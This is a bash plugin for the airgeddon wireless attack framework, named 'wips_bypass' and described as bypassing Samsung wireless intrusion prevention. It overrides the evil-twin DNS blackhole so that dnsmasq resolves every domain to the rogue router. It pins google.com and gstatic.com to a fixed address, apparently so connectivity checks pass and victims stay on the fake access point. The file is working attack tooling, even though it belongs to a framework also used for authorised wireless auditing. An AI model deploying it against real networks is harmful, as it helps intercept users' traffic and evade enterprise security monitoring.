"#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="wips_bypass"
plugin_description="Test plugin to bypass samsung wips"
plugin_author="xpz3"

#Enabled 1 / Disabled 0 - Set this plugin as enabled - Default value 1
plugin_enabled=1

plugin_minimum_ag_affected_version="11.41"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")

function wips_bypass_override_launch_dns_blackhole() {

	debug_print

	recalculate_windows_sizes

	rm -rf "${tmpdir}${dnsmasq_file}" > /dev/null 2>&1

	{
	echo -e "interface=${interface}"
	echo -e "address=/#/${et_ip_router}"
	echo -e "port=${dns_port}"
	echo -e "bind-dynamic"
	echo -e "except-interface=${loopback_interface}"
	echo -e "address=/google.com/172.217.5.238"
	echo -e "address=/gstatic.com/172.217.5.238"
	echo -e "address=/google.com.onion/"
	echo -e "no-dhcp-interface=${interface}"
	echo -e "log-queries"
	echo -e "no-daemon"
	echo -e "no-resolv"
	echo -e "no-hosts"
	} >> "${tmpdir}${dnsmasq_file}"

	manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}